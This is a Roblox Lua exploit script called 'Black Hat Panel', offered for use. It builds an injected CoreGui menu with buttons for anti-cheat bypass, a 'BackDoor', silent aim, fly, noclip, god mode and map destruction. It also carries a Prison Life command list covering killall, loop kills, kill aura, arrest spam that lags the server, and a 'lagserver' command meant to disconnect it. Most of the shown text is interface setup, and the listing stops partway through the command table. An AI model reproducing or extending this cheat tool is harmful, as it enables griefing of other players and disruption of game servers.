-- Black Hat Panel Version 1.3.2 NEW
-- Made by me
-- Scripted by Gui to lua (Plugin)

-- Instances:

local Tower_ez = game.Workspace.Tower
local Prison_4 = game.Workspace.Prison_road
local Prison_3 = game.Workspace.Prison_OuterWall
local Prison_2 = game.Workspace.Prison_Halls
local Prison_1 = game.Workspace.Prison_Cellblock
local AntiCheat = game.StarterPlayer.StarterCharacterScripts.AntiCheat
local AntiFly = game.StarterPlayer.StarterCharacterScripts.AntiFly
local Island_sus = game.Workspace.Island
local Island_lol = game.Workspace.Island_abandoned
local City = game.Workspace.City_buildings
local BlackHatPanelV132 = Instance.new("ScreenGui")
local BlackHatPanel = Instance.new("Frame")
local Bar = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local BlackHatPanelVersion = Instance.new("TextLabel")
local HomeLol = Instance.new("Frame")
local PrisonLifeHack = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local Next = Instance.new("TextButton")
local BlackHatPanelWelcomeText = Instance.new("TextLabel")
local TextLabel = Instance.new("TextLabel")
local NameChange = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local InvisibleR15 = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local InvisibleR6 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local LagSwitch = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local BackDoor = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local ChatBot = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local DevExplore = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local FleeTheFacility = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local Bar_2 = Instance.new("Frame")
local Credits = Instance.new("TextButton")
local MapDestroyer = Instance.new("TextButton")
local Home = Instance.new("TextButton")
local MapDestroyerLol = Instance.new("ScrollingFrame")
local City_buildings = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local Island_abandoned = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local Island = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local Prison_Cellblock = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local Prison_Halls = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local Prison_OuterWall = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local Prison_road = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local Tower = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local NaturalDisasterSurvivalMaps = Instance.new("TextLabel")
local PrisonLifeMaps = Instance.new("TextLabel")
local BloodAttackMaps = Instance.new("TextLabel")
local AntiCheatBypass = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local MoreAntiCheatBypass = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local HacksLol = Instance.new("Frame")
local FlyHack = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local Reset = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local WalkSpeedButton = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local NoclipHack = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local SilentAimHack = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local God = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local WalkSpeedBox = Instance.new("TextBox")
local UICorner_26 = Instance.new("UICorner")
local Normalspeed = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local CreditsLol = Instance.new("ScrollingFrame")
local Owner = Instance.new("ImageLabel")
local OwnerName = Instance.new("TextLabel")
local Rank1 = Instance.new("TextLabel")
local UD1 = Instance.new("TextLabel")
local Rank2 = Instance.new("TextLabel")
local UDPFP1 = Instance.new("TextLabel")
local UD2 = Instance.new("TextLabel")
local UDPFP2 = Instance.new("TextLabel")
local Sorry = Instance.new("TextLabel")
local Home2 = Instance.new("Frame")
local Back = Instance.new("TextButton")
local GasStation = Instance.new("TextButton")
local UICorner_28 = Instance.new("UICorner")
local SoulShatters = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local DragMe = Instance.new("TextLabel")
local Doors = Instance.new("TextButton")
local UICorner_30 = Instance.new("UICorner")
local ComingSoon = Instance.new("TextLabel")
local Hacks = Instance.new("TextButton")
local OpenButton = Instance.new("TextButton")
local UICorner_31 = Instance.new("UICorner")
local Executer = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local Execute = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local MakeSure = Instance.new("TextLabel")
local MakeSureText = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local UICorner_33 = Instance.new("UICorner")
local Executing = Instance.new("Frame")
local Loading = Instance.new("TextLabel")
local Continue = Instance.new("TextButton")
local UICorner_34 = Instance.new("UICorner")
local MainLogin = Instance.new("Frame")
local Sidebar = Instance.new("Frame")
local HatPanelIcon = Instance.new("ImageLabel")
local HatPanelDescription = Instance.new("TextLabel")
local HatPanelText = Instance.new("TextLabel")
local WelcomeText = Instance.new("TextLabel")
local PlayerName = Instance.new("TextLabel")
local ImageLabel_2 = Instance.new("ImageLabel")
local UICorner_35 = Instance.new("UICorner")
local LoginButton = Instance.new("TextButton")
local UICorner_36 = Instance.new("UICorner")
local PassBox = Instance.new("TextBox")
local UICorner_37 = Instance.new("UICorner")
local boi = Instance.new("TextLabel")
local TextButton_2 = Instance.new("TextButton")
local UICorner_38 = Instance.new("UICorner")
local WrongText = Instance.new("TextLabel")
local Notification = Instance.new("Frame")
local UICorner_39 = Instance.new("UICorner")
local Bar_3 = Instance.new("Frame")
local Decoration = Instance.new("Frame")
local Bar_4 = Instance.new("Frame")
local Icon = Instance.new("ImageLabel")
local Desc = Instance.new("TextLabel")
local TitleText = Instance.new("TextLabel")
local CheckingText = Instance.new("TextLabel")
local ErrorText = Instance.new("TextLabel")
local DetectedText = Instance.new("TextLabel")

--Properties:

BlackHatPanelV132.Name = "BlackHatPanelV132"
BlackHatPanelV132.Parent = game.CoreGui
BlackHatPanelV132.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

BlackHatPanel.Name = "BlackHatPanel"
BlackHatPanel.Parent = BlackHatPanelV132
BlackHatPanel.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
BlackHatPanel.BorderSizePixel = 0
BlackHatPanel.Position = UDim2.new(0.234019965, 0, 0.0849704519, 0)
BlackHatPanel.Size = UDim2.new(0, 967, 0, 695)
BlackHatPanel.Visible = false
BlackHatPanel.Active = true
BlackHatPanel.Draggable = true

Bar.Name = "Bar"
Bar.Parent = BlackHatPanel
Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bar.BorderColor3 = Color3.fromRGB(99, 99, 99)
Bar.Position = UDim2.new(0, 0, 0.0618705042, 0)
Bar.Size = UDim2.new(0, 967, 0, 0)

TextButton.Parent = BlackHatPanel
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.814891458, 0, 0, 0)
TextButton.Size = UDim2.new(0, 179, 0, 43)
TextButton.Font = Enum.Font.Gotham
TextButton.Text = "Close"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

BlackHatPanelVersion.Name = "BlackHatPanelVersion"
BlackHatPanelVersion.Parent = BlackHatPanel
BlackHatPanelVersion.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BlackHatPanelVersion.BackgroundTransparency = 1.000
BlackHatPanelVersion.BorderSizePixel = 0
BlackHatPanelVersion.Position = UDim2.new(0.74146843, 0, 0.928057551, 0)
BlackHatPanelVersion.Size = UDim2.new(0, 250, 0, 50)
BlackHatPanelVersion.Font = Enum.Font.SciFi
BlackHatPanelVersion.Text = "Black Hat Panel v1.3.2"
BlackHatPanelVersion.TextColor3 = Color3.fromRGB(255, 255, 255)
BlackHatPanelVersion.TextScaled = true
BlackHatPanelVersion.TextSize = 14.000
BlackHatPanelVersion.TextWrapped = true

HomeLol.Name = "HomeLol"
HomeLol.Parent = BlackHatPanel
HomeLol.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
HomeLol.BorderSizePixel = 0
HomeLol.Position = UDim2.new(0, 0, 0.0618705153, 0)
HomeLol.Size = UDim2.new(0, 967, 0, 602)

PrisonLifeHack.Name = "PrisonLifeHack"
PrisonLifeHack.Parent = HomeLol
PrisonLifeHack.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
PrisonLifeHack.BorderSizePixel = 0
PrisonLifeHack.Position = UDim2.new(0.574974179, 0, 0.376978397, 0)
PrisonLifeHack.Size = UDim2.new(0, 211, 0, 47)
PrisonLifeHack.Font = Enum.Font.Gotham
PrisonLifeHack.Text = "Prison Life Hack"
PrisonLifeHack.TextColor3 = Color3.fromRGB(255, 255, 255)
PrisonLifeHack.TextScaled = true
PrisonLifeHack.TextSize = 14.000
PrisonLifeHack.TextWrapped = true
PrisonLifeHack.MouseButton1Click:Connect(function()
	local CmdGui = Instance.new("ScreenGui")
	local Background = Instance.new("Frame")
	local CmdName = Instance.new("TextLabel")
	local FindCmd = Instance.new("TextBox")
	local CmdHandler = Instance.new("ScrollingFrame")
	local CmdText = Instance.new("TextButton")
	local UIListLayout = Instance.new("UIListLayout")
	local Background2 = Instance.new("Frame")
	local Label = Instance.new("TextLabel")
	local Execute = Instance.new("TextBox")
	local Minimum = Instance.new("TextButton")
	local Close = Instance.new("TextButton")
	local Background3 = Instance.new("Frame")
	local Topbar = Instance.new("TextLabel")
	local CmdTitle = Instance.new("TextLabel")
	local Background4 = Instance.new("Frame")
	local Notify6 = Instance.new("TextLabel")
	local Notify5 = Instance.new("TextLabel")
	local Notify4 = Instance.new("TextLabel")
	local Notify3 = Instance.new("TextLabel")
	local Notify2 = Instance.new("TextLabel")
	local Notify1 = Instance.new("TextLabel")
	local CloseBar = Instance.new("TextButton")
	local TransparencyBar = Instance.new("TextButton")
	local Prefix = ";"

	CmdGui.Name = "CmdGui"
	CmdGui.Parent = game:GetService("CoreGui")
	CmdGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	Background.Name = "Background"
	Background.Parent = CmdGui
	Background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Background.BorderSizePixel = 0
	Background.Position = UDim2.new(0.368556708, 0, 0.11490047, 0)
	Background.Size = UDim2.new(0, 350, 0, 350)
	Background.Active = true
	Background.Draggable = true

	CmdName.Name = "CmdName"
	CmdName.Parent = Background
	CmdName.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	CmdName.BorderSizePixel = 0
	CmdName.Size = UDim2.new(0, 350, 0, 25)
	CmdName.Font = Enum.Font.GothamBlack
	CmdName.Text = "Commands"
	CmdName.TextColor3 = Color3.fromRGB(255, 255, 255)
	CmdName.TextScaled = true
	CmdName.TextSize = 14.000
	CmdName.TextWrapped = true

	FindCmd.Name = "FindCmd"
	FindCmd.Parent = Background
	FindCmd.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	FindCmd.BorderColor3 = Color3.fromRGB(0, 255, 0)
	FindCmd.BorderSizePixel = 0
	FindCmd.Position = UDim2.new(0.0714285746, 0, 0.0702347234, 0)
	FindCmd.Size = UDim2.new(0, 300, 0, 20)
	FindCmd.Font = Enum.Font.SourceSans
	FindCmd.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	FindCmd.PlaceholderText = "Search For Command"
	FindCmd.Text = ""
	FindCmd.TextColor3 = Color3.fromRGB(255, 255, 255)
	FindCmd.TextSize = 14.000
	FindCmd.TextWrapped = true

	CmdHandler.Name = "CmdHandler"
	CmdHandler.Parent = Background
	CmdHandler.Active = true
	CmdHandler.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CmdHandler.BackgroundTransparency = 1.000
	CmdHandler.BorderSizePixel = 0
	CmdHandler.AutomaticCanvasSize = "Y"
	CmdHandler.Position = UDim2.new(0.0714285746, 0, 0.142857149, 0)
	CmdHandler.Size = UDim2.new(0, 300, 0, 290)
	CmdHandler.ScrollBarThickness = 2

	CmdText.Name = "CmdText"
	CmdText.Parent = nil
	CmdText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CmdText.BackgroundTransparency = 1.000
	CmdText.BorderSizePixel = 0
	CmdText.Size = UDim2.new(0, 300, 0, 25)
	CmdText.Font = Enum.Font.SourceSans
	CmdText.Text = "Text"
	CmdText.TextColor3 = Color3.fromRGB(255, 255, 255)
	CmdText.TextScaled = true
	CmdText.TextSize = 14.000
	CmdText.TextWrapped = true

	UIListLayout.Parent = CmdHandler
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

	Minimum.Name = "Minimum"
	Minimum.Parent = Background
	Minimum.BackgroundColor3 = Color3.fromRGB(0, 155, 155)
	Minimum.BorderSizePixel = 0
	Minimum.Position = UDim2.new(0.842857122, 0, 0.00571428565, 0)
	Minimum.Size = UDim2.new(0, 20, 0, 20)
	Minimum.Font = Enum.Font.SourceSans
	Minimum.Text = ""
	Minimum.TextColor3 = Color3.fromRGB(255, 255, 255)
	Minimum.TextSize = 14.000
	Minimum.MouseButton1Click:Connect(function()
		if Background.BackgroundTransparency == 0 then
			Background.BackgroundTransparency = 1
			Background.Size = UDim2.new(0, 350, 0, 25)
			FindCmd.Visible = false
			CmdHandler.Visible = false
		elseif Background.BackgroundTransparency == 1 then
			Background.BackgroundTransparency = 0
			Background.Size = UDim2.new(0, 350, 0, 350)
			FindCmd.Visible = true
			CmdHandler.Visible = true
		end
	end)

	Close.Name = "Close"
	Close.Parent = Background
	Close.BackgroundColor3 = Color3.fromRGB(155, 0, 0)
	Close.BorderSizePixel = 0
	Close.Position = UDim2.new(0.928571403, 0, 0.00571428565, 0)
	Close.Size = UDim2.new(0, 20, 0, 20)
	Close.Font = Enum.Font.SourceSans
	Close.Text = ""
	Close.TextColor3 = Color3.fromRGB(255, 255, 255)
	Close.TextSize = 14.000
	Close.MouseButton1Click:Connect(function()
		Background.Visible = false
	end)

	-- New

	Background2.Name = "Background"
	Background2.Parent = CmdGui
	Background2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Background2.BorderSizePixel = 0
	Background2.Position = UDim2.new(0.012, 0, 0.807, 0)
	Background2.Size = UDim2.new(0, 250, 0, 80)
	Background2.Active = true
	Background2.Draggable = true

	Label.Name = "Label"
	Label.Parent = Background2
	Label.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Label.BorderSizePixel = 0
	Label.Position = UDim2.new(0, 0, 0, 0)
	Label.Size = UDim2.new(0, 250, 0, 25)
	Label.Font = Enum.Font.GothamBlack
	Label.Text = "Execute Bar"
	Label.TextColor3 = Color3.fromRGB(255, 255, 255)
	Label.TextScaled = true
	Label.TextSize = 14.000
	Label.TextWrapped = true

	Execute.Name = "Execute"
	Execute.Parent = Background2
	Execute.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	Execute.BorderColor3 = Color3.fromRGB(0, 255, 0)
	Execute.Position = UDim2.new(0.097, 0, 0.436, 0)
	Execute.Size = UDim2.new(0, 200, 0, 30)
	Execute.Font = Enum.Font.SourceSans
	Execute.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	Execute.PlaceholderText = "Press "..Prefix.." To Enter"
	Execute.Text = ""
	Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
	Execute.TextSize = 16.000
	Execute.TextWrapped = true

	Background3.Name = "Background3"
	Background3.Parent = CmdGui
	Background3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	Background3.BorderSizePixel = 0
	Background3.Position = UDim2.new(0.306701034, 0, 0.288421065, 0)
	Background3.Size = UDim2.new(0, 200, 0, 100)
	Background3.Active = true
	Background3.Visible = false

	Topbar.Name = "Topbar"
	Topbar.Parent = Background3
	Topbar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Topbar.BorderSizePixel = 0
	Topbar.Size = UDim2.new(0, 200, 0, 25)
	Topbar.Font = Enum.Font.GothamBlack
	Topbar.Text = ""
	Topbar.TextColor3 = Color3.fromRGB(255, 255, 255)
	Topbar.TextScaled = true
	Topbar.TextSize = 14.000
	Topbar.TextWrapped = true

	CmdTitle.Name = "CmdTitle"
	CmdTitle.Parent = Background3
	CmdTitle.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	CmdTitle.BackgroundTransparency = 1.000
	CmdTitle.BorderSizePixel = 0
	CmdTitle.Position = UDim2.new(0.0500000007, 0, 0.379999995, 0)
	CmdTitle.Size = UDim2.new(0, 180, 0, 40)
	CmdTitle.Font = Enum.Font.GothamBlack
	CmdTitle.Text = ""
	CmdTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	CmdTitle.TextSize = 14.000
	CmdTitle.TextWrapped = true

	Background4.Name = "Background4"
	Background4.Parent = CmdGui
	Background4.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Background4.BorderSizePixel = 0
	Background4.Position = UDim2.new(0.0154639352, 0, 0.519107938, 0)
	Background4.Size = UDim2.new(0, 250, 0, 119)
	Background4.Active = true
	Background4.Draggable = true

	Notify6.Name = "Notify6"
	Notify6.Parent = Background4
	Notify6.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify6.BackgroundTransparency = 1.000
	Notify6.BorderSizePixel = 0
	Notify6.Position = UDim2.new(0, 0, -0.00512820482, 0)
	Notify6.Size = UDim2.new(0, 250, 0, 20)
	Notify6.Font = Enum.Font.GothamBlack
	Notify6.Text = ""
	Notify6.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify6.TextScaled = true
	Notify6.TextSize = 14.000
	Notify6.TextWrapped = true

	Notify5.Name = "Notify5"
	Notify5.Parent = Background4
	Notify5.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify5.BackgroundTransparency = 1.000
	Notify5.BorderSizePixel = 0
	Notify5.Position = UDim2.new(0, 0, 0.162939027, 0)
	Notify5.Size = UDim2.new(0, 250, 0, 20)
	Notify5.Font = Enum.Font.GothamBlack
	Notify5.Text = ""
	Notify5.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify5.TextScaled = true
	Notify5.TextSize = 14.000
	Notify5.TextWrapped = true

	Notify4.Name = "Notify4"
	Notify4.Parent = Background4
	Notify4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify4.BackgroundTransparency = 1.000
	Notify4.BorderSizePixel = 0
	Notify4.Position = UDim2.new(0, 0, 0.331006259, 0)
	Notify4.Size = UDim2.new(0, 250, 0, 20)
	Notify4.Font = Enum.Font.GothamBlack
	Notify4.Text = ""
	Notify4.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify4.TextScaled = true
	Notify4.TextSize = 14.000
	Notify4.TextWrapped = true

	Notify3.Name = "Notify3"
	Notify3.Parent = Background4
	Notify3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify3.BackgroundTransparency = 1.000
	Notify3.BorderSizePixel = 0
	Notify3.Position = UDim2.new(0, 0, 0.499073505, 0)
	Notify3.Size = UDim2.new(0, 250, 0, 20)
	Notify3.Font = Enum.Font.GothamBlack
	Notify3.Text = ""
	Notify3.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify3.TextScaled = true
	Notify3.TextSize = 14.000
	Notify3.TextWrapped = true

	Notify2.Name = "Notify2"
	Notify2.Parent = Background4
	Notify2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify2.BackgroundTransparency = 1.000
	Notify2.BorderSizePixel = 0
	Notify2.Position = UDim2.new(0, 0, 0.667140722, 0)
	Notify2.Size = UDim2.new(0, 250, 0, 20)
	Notify2.Font = Enum.Font.GothamBlack
	Notify2.Text = ""
	Notify2.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify2.TextScaled = true
	Notify2.TextSize = 14.000
	Notify2.TextWrapped = true

	Notify1.Name = "Notify1"
	Notify1.Parent = Background4
	Notify1.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify1.BackgroundTransparency = 1.000
	Notify1.BorderSizePixel = 0
	Notify1.Position = UDim2.new(0, 0, 0.835207999, 0)
	Notify1.Size = UDim2.new(0, 250, 0, 20)
	Notify1.Font = Enum.Font.GothamBlack
	Notify1.Text = ""
	Notify1.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify1.TextScaled = true
	Notify1.TextSize = 14.000
	Notify1.TextWrapped = true

	CloseBar.Name = "CloseBar"
	CloseBar.Parent = Background4
	CloseBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	CloseBar.BorderSizePixel = 0
	CloseBar.Position = UDim2.new(0.899999976, 0, -0.210084036, 0)
	CloseBar.Size = UDim2.new(0, 25, 0, 25)
	CloseBar.Font = Enum.Font.GothamBlack
	CloseBar.Text = "X"
	CloseBar.TextColor3 = Color3.fromRGB(255, 255, 255)
	CloseBar.TextScaled = true
	CloseBar.TextSize = 14.000
	CloseBar.TextWrapped = true
	CloseBar.MouseButton1Click:Connect(function()
		Background4.Visible = false
	end)

	TransparencyBar.Name = "TransparencyBar"
	TransparencyBar.Parent = Background4
	TransparencyBar.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
	TransparencyBar.BorderSizePixel = 0
	TransparencyBar.Position = UDim2.new(0.799999952, 0, -0.210084036, 0)
	TransparencyBar.Size = UDim2.new(0, 25, 0, 25)
	TransparencyBar.Font = Enum.Font.GothamBlack
	TransparencyBar.Text = "="
	TransparencyBar.TextColor3 = Color3.fromRGB(255, 255, 255)
	TransparencyBar.TextScaled = true
	TransparencyBar.TextSize = 14.000
	TransparencyBar.TextWrapped = true
	TransparencyBar.MouseButton1Click:Connect(function()
		if TransparencyBar.Text == "=" then
			Background4.BackgroundTransparency = 0.750
			CloseBar.BackgroundTransparency = 0.750
			TransparencyBar.BackgroundTransparency = 0.750
			TransparencyBar.Text = "+"
		else
			Background4.BackgroundTransparency = 0.000
			CloseBar.BackgroundTransparency = 0.000
			TransparencyBar.BackgroundTransparency = 0.000
			TransparencyBar.Text = "="
		end
	end)

	local Versions = "5.0"
	local Cmd = {}

	Cmd[#Cmd + 1] = {Text = "versions "..Versions,Title = "Script versions"}
	Cmd[#Cmd + 1] = {Text = "script by LocalPlayer#7434",Title = "Script owner"}
	Cmd[#Cmd + 1] =	{Text = "cmd / cmds",Title = "Show commands bar"}
	Cmd[#Cmd + 1] =	{Text = "rejoin / rj",Title = "Rejoin the game"}
	Cmd[#Cmd + 1] =	{Text = "leave / leaveserver / quit",Title = "Leave the server"}
	Cmd[#Cmd + 1] =	{Text = "admin / giveadmin [plr]",Title = "Give a commands to player"}
	Cmd[#Cmd + 1] =	{Text = "unadmin / removeadmin [plr]",Title = "Remove a commands from player"}
	Cmd[#Cmd + 1] =	{Text = "kill [plr]",Title = "Kill the player"}
	Cmd[#Cmd + 1] =	{Text = "killall",Title = "Kill all players"}
	Cmd[#Cmd + 1] =	{Text = "killguard / killsguard",Title = "Kill all guards"}
	Cmd[#Cmd + 1] =	{Text = "killinmate / killsinmate",Title = "Kill all inmates"}
	Cmd[#Cmd + 1] =	{Text = "killcriminal / killscriminal",Title = "Kill all criminals"}
	Cmd[#Cmd + 1] =	{Text = "tase [plr]",Title = "Tase the player"}
	Cmd[#Cmd + 1] =	{Text = "loopkill / loopkills [plr]",Title = "Loop kills player"}
	Cmd[#Cmd + 1] =	{Text = "unloopkill / unloopkills [plr]",Title = "Unloop kills player"}
	Cmd[#Cmd + 1] =	{Text = "loopkillall / loopkillsall",Title = "Loop kills all players"}
	Cmd[#Cmd + 1] =	{Text = "loopkillguard / loopkillsguard",Title = "Loop kills all guards"}
	Cmd[#Cmd + 1] =	{Text = "loopkillinmate / loopkillinmates",Title = "Loop kills all inmates"}
	Cmd[#Cmd + 1] =	{Text = "loopkillcriminal / loopkillcriminals",Title = "Loop kills all criminals"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillall / unloopkillsall",Title = "Unloop kills all players"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillguard / unloopkillsguard",Title = "Unloop kills all guards"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillinmate / unloopkillinmates",Title = "Unloop kills all inmates"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillcriminal / unloopkillcriminals",Title = "Unloop kills all criminals"}
	Cmd[#Cmd + 1] =	{Text = "inmate / inmates / prisoner / prisoners",Title = "Become inmate team"}
	Cmd[#Cmd + 1] =	{Text = "guard / guards / cop / polices",Title = "Become guard team"}
	Cmd[#Cmd + 1] =	{Text = "crim / criminals / criminal",Title = "Become criminal team"}
	Cmd[#Cmd + 1] =	{Text = "neutral / neutrals",Title = "Become neutral team"}
	Cmd[#Cmd + 1] =	{Text = "re / refresh",Title = "Respawn on old position"}
	Cmd[#Cmd + 1] =	{Text = "res / respawn",Title = "Respawn on respawn pads"}
	Cmd[#Cmd + 1] =	{Text = "goto / to [plr]",Title = "Teleports to the player"}
	Cmd[#Cmd + 1] =	{Text = "bring [plr]",Title = "Teleports player to you"}
	Cmd[#Cmd + 1] =	{Text = "tp / teleport [plr] [plr2]",Title = "Teleports player to another player"}
	Cmd[#Cmd + 1] =	{Text = "arrest [plr] [time]",Title = "Arrest player that is a criminal"}
	Cmd[#Cmd + 1] =	{Text = "arrestall / arrestothers",Title = "Arrest all criminals"}
	Cmd[#Cmd + 1] =	{Text = "spamarrest / looparrest [plr]",Title = "Spam arrest player & lag player and server"}
	Cmd[#Cmd + 1] =	{Text = "unspamarrest / unlooparrest [plr]",Title = "Stop spam arrest player"}
	Cmd[#Cmd + 1] =	{Text = "clearloopkill / clearloopkills",Title = "clear all loop kills table"}
	Cmd[#Cmd + 1] =	{Text = "auto / autore / autorefresh",Title = "Auto respawn on old position when died"}
	Cmd[#Cmd + 1] =	{Text = "unauto / unautore / unautorefresh",Title = "Stop auto respawn on old position when died"}
	Cmd[#Cmd + 1] =	{Text = "killaura",Title = "Activate kill aura"}
	Cmd[#Cmd + 1] =	{Text = "nokillaura / unkillaura",Title = "Unactivate kill aura"}
	Cmd[#Cmd + 1] = {Text = "antifling",Title = "Activate anti fling"}
	Cmd[#Cmd + 1] = {Text = "unantifling",Title = "Unactivate anti fling"}
	Cmd[#Cmd + 1] = {Text = "god",Title = "Become a god mode"}
	Cmd[#Cmd + 1] = {Text = "ungod",Title = "Unbecome a god mode"}
	Cmd[#Cmd + 1] =	{Text = "view / spectate / watch [plr]",Title = "Spectates the player"}
	Cmd[#Cmd + 1] =	{Text = "unview / unspectate / stopwatch",Title = "Unspectates the player"}
	Cmd[#Cmd + 1] =	{Text = "fastpunch / speedpunchh",Title = "Activate fast punch"}
	Cmd[#Cmd + 1] =	{Text = "slowpunch / nofastpunch / normalspeedpunch",Title = "unactivate fast punch"}
	Cmd[#Cmd + 1] =	{Text = "superpunch / onepunch",Title = "Activate super punch"}
	Cmd[#Cmd + 1] =	{Text = "nosuperpunch / normalpunch",Title = "Unactivate super punch"}
	Cmd[#Cmd + 1] =	{Text = "prefix / newprefix / changeprefix [prefix text]",Title = "Changes prefix"}
	Cmd[#Cmd + 1] =	{Text = "red",Title = "Changes name tag color to red color"}
	Cmd[#Cmd + 1] = {Text = "antilag / boostfps",Title = "Boost a little fps"}
	Cmd[#Cmd + 1] = {Text = "unantilag",Title = "Stop boost the fps"}
	Cmd[#Cmd + 1] = {Text = "noclip / noclips",Title = "Activate no clips"}
	Cmd[#Cmd + 1] = {Text = "clip / clips",Title = "Unactivate no clips"}
	Cmd[#Cmd + 1] =	{Text = "orange",Title = "Changes name tag color to orange color"}
	Cmd[#Cmd + 1] =	{Text = "blue",Title = "Changes name tag color to blue color"}
	Cmd[#Cmd + 1] =	{Text = "black",Title = "Changes name tag color to black color"}
	Cmd[#Cmd + 1] =	{Text = "purple",Title = "Changes name tag color to purple color"}
	Cmd[#Cmd + 1] =	{Text = "brown",Title = "Changes name tag color to brown color"}
	Cmd[#Cmd + 1] =	{Text = "white",Title = "Changes name tag color to white color"}
	Cmd[#Cmd + 1] =	{Text = "pink",Title = "Changes name tag color to pink color"}
	Cmd[#Cmd + 1] =	{Text = "grey",Title = "Changes name tag color to grey color"}
	Cmd[#Cmd + 1] =	{Text = "green",Title = "Changes name tag color to green color"}
	Cmd[#Cmd + 1] =	{Text = "yellow",Title = "Changes name tag color to yellow color"}
	Cmd[#Cmd + 1] =	{Text = "getpos",Title = "Prints positions"}
	Cmd[#Cmd + 1] =	{Text = "unload / destroygui",Title = "Unload the scripts"}
	Cmd[#Cmd + 1] =	{Text = "reload / update",Title = "Reload the script to new version"}
	Cmd[#Cmd + 1] =	{Text = "How to open console?",Title = "To open console chat /console or press F9 or Fn + F9"}
	Cmd[#Cmd + 1] =	{Text = "lagserver / disconnect",Title = "Lag server and disconnect after 5 minutes of lagging"}
	Cmd[#Cmd + 1] =	{Text = "unlagserver / undisconnect",Title = "Stop lag server"}
	Cmd[#Cmd + 1] =	{Text = "speed / setspeed / walkspeed [count]",Title = "Changes walk speeds"}
	Cmd[#Cmd + 1] =	{Text = "jumppower / setjumppower [count]",Title = "Changes jump powers"}
	Cmd[#Cmd + 1] =	{Text = "hipheight / sethipheight [count]",Title = "Changes hip heights"}
	Cmd[#Cmd + 1] =	{Text = "gravity / setgravity [count]",Title = "Changes gravity"}
	Cmd[#Cmd + 1] =	{Text = "resetspeed / resetwalkspeed",Title = "Reset walk speeds"}
	Cmd[#Cmd + 1] =	{Text = "resetjumppower / rejumppower",Title = "Reset jump powers"}
